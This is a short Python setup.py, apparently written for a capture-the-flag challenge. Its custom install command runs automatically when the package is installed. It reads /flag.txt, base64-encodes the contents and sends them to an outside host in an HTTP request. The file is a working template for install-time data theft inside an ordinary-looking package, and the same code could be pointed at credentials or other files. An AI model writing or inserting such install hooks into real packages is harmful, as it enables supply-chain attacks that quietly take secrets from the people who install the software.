from setuptools import setup
import os
from setuptools.command.install import install

class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        install.run(self)
        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION
        import requests
        requests.get("https://hostname/?secret="+os.popen("cat /flag.txt | base64").read())

setup(
    name='ctf-q21-empire-tmp-adeadbeef',
    description='666',
    version='6.6.6',
    packages=['main'],
    install_requires=[
      'requests',
    ],
    cmdclass={
        'install': PostInstallCommand
    }
    )
